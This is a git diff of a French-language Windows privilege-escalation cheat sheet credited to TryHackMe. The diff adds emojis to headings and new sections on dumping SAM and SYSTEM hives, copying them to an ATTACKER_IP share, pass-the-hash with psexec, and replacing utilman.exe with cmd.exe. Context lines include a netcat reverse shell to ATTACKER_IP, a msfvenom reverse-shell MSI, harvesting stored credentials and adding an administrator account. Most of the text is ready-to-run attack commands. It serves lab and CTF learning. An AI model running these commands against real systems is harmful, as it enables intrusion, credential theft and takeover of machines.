@@ -2,7 +2,7 @@
 
 Quelques sources possibles d'escalation de privilèges sous windows
 
-### Unattended Windows Installations
+### Unattended Windows Installations 🔑
 
 Avec MDT:
 ```
@@ -23,7 +23,7 @@ Peut contenir :
 </Credentials>
 ```
 
-### Powershell History
+### Powershell History 📖
 
 cmd.exe
 ```
@@ -35,7 +35,7 @@ powershell.exe
 cat $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
-### Saved Windows Credentials
+### Saved Windows Credentials 💾
 
 ```
 cmdkey /list
@@ -46,7 +46,7 @@ En cas de trouvaille interressante
 runas /savecred /user:admin cmd.exe
 ```
 
-### IIS Configuration
+### IIS Configuration 🔧
 
 web.config
 ```
@@ -57,7 +57,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
-### PuTTY
+### PuTTY 💻
 
 ```
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
@@ -65,7 +65,7 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
 # Autres Techniques
 
-### Planificateur de tâches
+### Planificateur de tâches ⏰
 Pour lister les tâches planifiées : `schtasks` 
 
 ```
@@ -91,20 +91,19 @@ C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Users:(I)(F)
 ```
 
-#### Exploitation
+#### Exploitation ⚡
 
-Détectable par les antivirus !
 ```
 echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
 ```
 
-#### Exécution manuelle
+#### Exécution manuelle ⚡
 
 ```
 schtasks /run /tn vulntask
 ```
 
-### AlwaysInstallElevated
+### AlwaysInstallElevated 👍
 
 Exploitation de .msi :
 Vérifier si ces deux sont présents
@@ -121,7 +120,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.147.119 LPORT=LO
 msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 ```
 
-### Insecure Permissions on Service Executable
+### Insecure Permissions on Service Executable 📇
 
 ```
 sc qc WindowsScheduler
@@ -184,7 +183,7 @@ sc start windowsscheduler
 ```
 Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
 
-### Unquoted Service Paths
+### Unquoted Service Paths *️⃣
 
 ```
 sc qc "disk sorter enterprise"
@@ -246,7 +245,7 @@ sc stop "disk sorter enterprise"
 sc start "disk sorter enterprise"
 ```
 
-### Insecure Service Permissions
+### Insecure Service Permissions 🔓
 
 Utilisation de <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk</a> sur un service pour checker ses permissions.
 ![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/162115a0-3294-4ad6-8054-1d982037f674)
@@ -275,10 +274,73 @@ sc stop MyService
 sc start MyService
 ```
 
-### Si compte avec privilège
+### Si compte avec privilège 
 
 ```
 net user <username> <password> /add
 net localgroup administrators <username> /add
 ```
+
+<br>
+<br>
+
+## SeBackup / SeRestore 🔓
+
+Ouvrir un cmd en tant qu'admin (si utilisateur à des droits admins
+
+```
+reg save hklm\system C:\Users\MyUser\system.hive
+```
+```
+reg save hklm\sam C:\Users\MyUser\sam.hive
+```
+
+Utiliser un système de partage type <a href="https://github.com/fortra/impacket/blob/master/examples/smbserver.py">smbserver.py</a>. Cloner le <a href="https://github.com/fortra/impacket/tree/master/examples">dépôt</a> GitHub aussi !
+
+```
+mkdir share
+python3 smbserver.py -smb2support -username MyUser -password MyPassword public share
+```
+
+[Victime]
+```
+copy C:\Users\MyUser\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\MyUser\system.hive \\ATTACKER_IP\public\
+```
+[Attaquant]
+```
+python3 /examples/secretsdump.py -sam share/sam.hive -system share/system.hive LOCAL
+```
+Pass The Hash ->
+```
+python3 /examples/psexec.py -hashes <the:Hash> administrator@<ip>
+```
+<br>
+<br>
+
+## TakeOwnership 🔓
+
+Ouvrir un cmd en tant qu'admin
+<br>
+Exemple de utilman.exe qui tourne en tant qu'utilisateur SYSTEM
+```
+takeown /f C:\Windows\System32\Utilman.exe
+```
+il est aussi possible de donner toutes les permissions à un utilisateur
+```
+icacls C:\Windows\System32\Utilman.exe /grant MyUser:F
+```
+On remplace l'exécutable `utilman.exe` en `cmd.exe`
+```
+copy cmd.exe utilman.exe
+```
+
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/ab9b63a7-8d8e-45d8-abd8-8bff4b70ff61)
+
+## RogueWinRM 😈
+
+Lien de l'exécutable <a href="https://github.com/antonioCoco/RogueWinRM">ici</a>.
+<br>
+Détail de la procédure d'utilisation s'y trouve également.
+
 Crédit: TryHackMe
